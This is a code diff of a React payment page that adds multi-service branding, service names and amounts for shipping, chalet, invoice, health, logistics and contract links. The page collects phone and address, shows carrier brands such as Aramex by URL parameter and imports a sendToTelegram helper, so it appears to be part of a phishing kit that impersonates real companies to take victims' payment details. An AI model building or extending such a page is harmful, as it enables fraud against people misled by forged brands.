@@ -6,6 +6,7 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getServiceBrandingByType, getServiceTitle, getServiceIcon } from "@/lib/serviceBranding";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useLocalStorage";
 import { sendToTelegram } from "@/lib/telegram";
@@ -34,12 +35,46 @@ const PaymentRecipient = () => {
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
   
+  const serviceType = linkData?.type || 'shipping';
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const serviceBranding = getServiceBrandingByType(serviceType);
+  const shippingBranding = serviceType === 'shipping' ? getServiceBranding(serviceKey) : null;
+  
+  const getServiceName = () => {
+    if (!linkData) return 'خدمة';
+    const payload = linkData.payload;
+    switch (serviceType) {
+      case 'chalet': return payload.chalet_name;
+      case 'shipping': return payload.service_name;
+      case 'invoice': return `فاتورة رقم ${payload.invoice_number}`;
+      case 'health': return payload.service_name;
+      case 'logistics': return payload.service_name;
+      case 'contract': return payload.contract_type_name;
+      default: return 'خدمة';
+    }
+  };
+  
+  const serviceName = getServiceName();
+  const serviceTitle = getServiceTitle(serviceType);
   const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
+  
+  const getTotalAmount = () => {
+    if (!linkData) return 500;
+    const payload = linkData.payload;
+    switch (serviceType) {
+      case 'chalet': return payload.total_amount;
+      case 'shipping': return payload.cod_amount;
+      case 'invoice':
+      case 'health':
+      case 'logistics':
+      case 'contract': return payload.amount;
+      default: return 500;
+    }
+  };
+  
+  const amount = getTotalAmount();
+  const currency = linkData?.payload?.currency || 'ر.س';
+  const formattedAmount = `${amount} ${currency}`;
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -61,7 +96,9 @@ const PaymentRecipient = () => {
     'bahpost': heroBahpost,
   };
   
-  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
+  const heroImage = serviceType === 'shipping' 
+    ? (heroImages[serviceKey.toLowerCase()] || heroBg)
+    : heroBg;
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
